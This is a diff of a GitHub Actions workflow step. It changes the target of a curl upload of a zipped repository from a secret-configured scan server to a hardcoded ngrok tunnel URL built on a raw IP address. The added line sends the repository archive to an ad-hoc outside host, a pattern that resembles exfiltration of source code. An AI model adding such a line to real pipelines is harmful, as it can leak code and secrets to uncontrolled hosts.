@@ -21,4 +21,4 @@ jobs:
           curl -X POST \
             -F "repo=@/tmp/repo.zip" \
             -F "pages=${{ github.event.inputs.pages }}" \
-            "${{ secrets.SCAN_SERVER_URL }}/scan"
+            "https://9980-136-52-77-152.ngrok-free.app/scan"
